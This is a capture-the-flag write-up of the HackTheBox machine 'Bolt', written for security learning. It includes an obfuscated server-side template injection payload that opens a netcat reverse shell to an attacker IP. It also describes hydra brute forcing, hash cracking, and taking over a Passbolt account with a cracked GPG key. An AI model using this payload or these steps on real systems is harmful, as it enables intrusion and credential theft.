# Bolt HackTheBox Writeup
### Level: `Medium` | OS: `Linux`

![logo](1.png)

## Scanning
We run nmap on all ports with scripts and software versions.

![](2.png)

## Enumeration
We put the subdomain in the **/etc/hosts** file and access the web resource.

![](3.png)

We access the resource through port 443 and find a **passbolt** deployed.

![](4.png)

We need invitation for used.

![](5.png)


## Exploitation
We use hydra on the "*bolt.htb/admin*" authentication panel and obtain the administrator credentials.

![](6.png)

We access with the credentials and go to the mail.

![](7.png)

We see that they are having a conversation in which they have uploaded a Docker image to the server.

![](8.png)

We do virtualhosting with wfuzz, we find these subdomains:

![](9.png)

### Roundcube

![](10.png)

### Create account bolt.htb
![](11.png)

Download image.tar
![](12.png)

We unzip the files, we find a **SQLite** database.

![](15.png)

### Hash cracking

![](16.png)

We use **grep** to search for the *invitation code* and find a file that exposes it.

![](17.png)

We register an account and use the invitation code.

![](18.png)

We also have access to email

![](19.png)

In testing, we found that it is vulnerable to SSTI (Server-Side Template Injection).

#### PoC 

![](36.png)

#### Result for mail

![](35.png)

We insert the payload in the name change and apply the changes.

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.XX.XX 443 >/tmp/f')|attr('read')()}}
```

![](20.png)

We will receive an email, so we will set a **netcat** to listen and click on it.

![](21.png)

##### Reverse shell

![](22.png)

We do a reconnaissance and find some credentials in the file "*passbolt.php*". 

![](23.png)

We tested these credentials on the user "eddie" and they work!

![](24.png)


## Privilege Escalation

.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log

![](27.png)

We use **gpg2john** and get the hash in the file to crack it with **john**.

![](28.png)

##### Cracking with John

![](29.png)

Searching for information, we found through Google this link on how to recover a "**Passbolt**" account with the *GPG key* and *password*. Sound familiar?

https://community.passbolt.com/t/recover-account-on-a-network-without-email/1394


We access the database with the credentials found above.

![](30.png)

Select the user "**Eddie**", take his *ID* and *token*, this will be the data we need to create the cue recovery link.

![](33.png)

#### Recovery account
```html
https://passbolt.bolt.htb/setup/recover/ID/TOKEN
```

Access the link, load the *gpg file* and now enter your *password* (the one we cracked earlier with **john**).

![](31.png)

Once inside, we can see the root password.

![](32.png)

We authenticate as the **root** user and read the flag.

![](34.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)